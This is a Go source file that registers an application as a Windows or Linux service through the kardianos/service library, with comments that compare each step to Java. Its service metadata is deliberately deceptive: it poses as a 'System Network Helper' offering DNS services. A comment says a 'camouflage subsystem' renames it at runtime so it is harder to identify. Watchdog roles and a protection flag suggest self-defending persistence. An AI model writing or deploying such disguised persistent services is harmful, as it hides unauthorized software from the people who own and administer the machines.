// service_runner.go wires the application into the kardianos/service framework,
// providing cross-platform service management for both Windows and Linux.
//
// kardianos/service abstracts:
//   - Windows: Service Control Manager (SCM) protocol
//   - Linux: systemd, Upstart, SysV init (auto-detected at runtime)
//
// Java analogy: implementing the Spring Boot ApplicationRunner interface and
// packaging as a jar that can be registered as a Windows service or a Linux
// systemd unit without changing a single line of application code.
//
// This file carries no build constraint so it compiles on every platform.
// All platform-specific details are handled inside the kardianos/service library.
package main

import (
	"log"
	"sync"

	"github.com/kardianos/service"
)

// program implements service.Interface – the two-method interface required by
// kardianos/service.  It holds the runtime parameters and the cancel function
// used to signal a graceful shutdown.
//
// Java analogy: a class that implements InitializingBean + DisposableBean, where
// afterPropertiesSet() submits the work to an ExecutorService and destroy()
// calls Future.cancel().
type program struct {
	// Configuration injected before Start() is called.
	role          string // "primary" or "watchdog"
	serviceName   string
	stateDir      string
	protectionOff bool

	// mu guards cancel so that Stop() can be called safely from any goroutine.
	// Java analogy: a ReentrantLock protecting a volatile CancellationToken.
	mu     sync.Mutex
	cancel func()
}

// Start is invoked by the service framework when the OS asks the service to
// begin.  It MUST return quickly; the real work runs in a goroutine.
//
// Java analogy: ApplicationRunner.run() that submits a Runnable to an
// ExecutorService and returns immediately so the container can proceed.
func (p *program) Start(s service.Service) error {
	// context.WithCancel creates a context that can be cancelled on demand.
	// Java analogy: new CancellationTokenSource() in C# / a Future that can be
	// cancelled.  In Go, contexts are the idiomatic cancellation mechanism.
	ctx, cancel := newRootContext()

	p.mu.Lock()
	p.cancel = cancel
	p.mu.Unlock()

	go func() {
		if err := runApplication(ctx, p.role, p.stateDir, p.serviceName, p.protectionOff); err != nil {
			log.Printf("application error: %v", err)
			// Notify the service manager that we stopped unexpectedly.
			// kardianos/service translates this to the appropriate OS signal.
			_ = s.Stop()
		}
	}()

	return nil
}

// Stop is invoked by the service framework when the OS asks the service to halt
// (e.g. "sc stop <name>" on Windows or "systemctl stop <name>" on Linux).
//
// Java analogy: @PreDestroy / DisposableBean.destroy() – tear-down hook.
func (p *program) Stop(_ service.Service) error {
	p.mu.Lock()
	cancel := p.cancel
	p.mu.Unlock()

	if cancel != nil {
		cancel()
	}
	return nil
}

// runAsService creates the cross-platform kardianos service object and runs the
// service event loop.
//
// When invoked by a service manager (Windows SCM / systemd) it speaks the
// native service protocol.  When started interactively from a terminal it
// behaves like a normal process and exits on SIGINT / SIGTERM.
//
// Java analogy: SpringApplication.run() which adapts its startup behaviour
// depending on whether a servlet container is detected.
func runAsService(role, serviceName, stateDir string, protectionOff bool) error {
	p := &program{
		role:          role,
		serviceName:   serviceName,
		stateDir:      stateDir,
		protectionOff: protectionOff,
	}

	// Build the service metadata shown in the OS service manager UI.
	// The camouflage subsystem may overwrite DisplayName and Description at
	// runtime to make the service harder to identify visually.
	args := []string{"--role=" + role}
	if stateDir != "" {
		args = append(args, "--state-dir="+stateDir)
	}

	cfg := &service.Config{
		// Name is the internal identifier used by sc.exe / systemctl.
		Name: serviceName,
		// DisplayName and Description are visible in services.msc / systemctl status.
		DisplayName: "System Network Helper",
		Description: "Provides network connectivity and DNS resolution services.",
		// Arguments are passed back to the binary when the OS starts the service.
		Arguments: args,
	}

	svc, err := service.New(p, cfg)
	if err != nil {
		return err
	}

	// svc.Run() handles the entire service lifecycle:
	//   • Running as a managed service → talks to the OS service manager.
	//   • Running interactively        → calls Start(), waits for OS signals,
	//                                    then calls Stop().
	// This single call replaces the old runningAsWindowsService() pattern.
	return svc.Run()
}
